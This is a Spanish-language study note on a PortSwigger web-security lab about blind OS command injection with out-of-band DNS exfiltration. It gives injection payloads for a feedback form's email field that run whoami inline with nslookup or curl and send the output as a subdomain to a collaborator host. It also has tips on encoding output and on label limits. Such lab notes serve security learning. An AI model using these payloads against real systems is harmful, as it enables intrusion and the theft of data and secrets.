---
aliases:
  - OS Command Injection 005 - OOB data exfiltration
  - blind command injection dns exfil
tags:
  - vuln/os-command-injection
  - example
  - portswigger
---

# 005 — Ciego out-of-band: exfil de datos por DNS ⭐

> Lab: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration) · **Practitioner** · técnica → [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]]

## ¿Por qué acá? (el techo del ciego)
- **En 004 solo confirmabas** que el DNS salía. Acá **exfiltrás la salida real** del comando… **metiéndola dentro del propio nombre DNS**.
- Es la variante más furtiva: sin output en la respuesta, sin archivos, solo una query DNS que **lleva tu dato en el subdominio**.

## Dónde se incrusta
- Mismo **`email`** del feedback (`POST /feedback/submit`).

## Cómo explotarlo
Ejecutás el comando **inline** (backticks / `$()`) para que su salida se sustituya como **subdominio** del lookup. Sirve `nslookup` (solo DNS) o `curl`/`wget` (DNS + HTTP):
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
email=||curl+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
El server resuelve `peter-XXXX.BURP-COLLABORATOR-SUBDOMAIN` → **la salida de `whoami` viaja en el hostname**.

## Verificación
- En **Collaborator → Poll now**, mirás la interacción DNS: en el **subdominio** aparece la salida (`peter-XXXX…`) → ese es el botín. El nombre completo está en la pestaña *Description*.

## Detalles que se pasan por alto
- **La ejecución inline es la clave** (`` `whoami` `` o `$(whoami)`): corre *dentro* del `nslookup` y su salida **se convierte** en parte del dominio. Sin inline, mandarías el texto literal.
- **Solo chars válidos de DNS** viajan: nada de espacios, `/`, saltos. Para salidas complejas, encadená `base64`/`sed`/`cut` y decodificás vos.
- **Un label DNS ≤ 63 chars** — si la salida es larga, se trunca. Para un **archivo entero** (un secreto, un token) el DNS no alcanza → POSTealo entero por HTTP (006).
- Techo del canal DNS, no del ataque: si tenés RCE, podés sacar archivos completos → 006.

→ Siguiente: [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006 · exfil de un archivo entero (POST OOB) ⭐]]
